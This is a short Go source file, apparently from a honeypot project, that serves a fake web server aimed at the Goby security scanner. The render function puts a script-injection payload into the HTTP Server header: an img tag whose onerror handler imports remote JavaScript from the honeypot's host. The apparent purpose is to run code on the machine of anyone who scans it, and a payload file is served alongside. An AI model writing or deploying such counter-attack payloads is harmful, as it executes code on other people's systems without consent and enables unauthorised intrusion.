package goby

import (
	"embed"
	"github.com/gin-contrib/static"
	"github.com/gin-gonic/gin"
	"honeypot/admin/tools"
	"honeypot/plugins"
	mylog "honeypot/utils/log"
	"net/http"
)

var (
	ip   string
	port string
)

var staticfile = tools.RandomAdminUrl()

//go:embed resource
var resource embed.FS

func render(c *gin.Context) {
	c.Writer.Header().Set("Server", "Nginx/<img	src=1	onerror=import(unescape('http%3A//"+ip+"%3A"+port+"/"+staticfile+"/api.js'))>\r\n")
}

func Goby() http.Handler {
	router := gin.New()
	router.Use(mylog.HttpLog("goby", "gobylog"))
	router.Use(static.Serve("/", plugins.EmbedFolder(resource, "resource")))
	router.StaticFile("/upload/common.js", tools.GobyFile)
	router.GET("/", render)
	return router
}

func SetInfo(ip1 string, port1 string) {
	ip = ip1
	port = port1
}
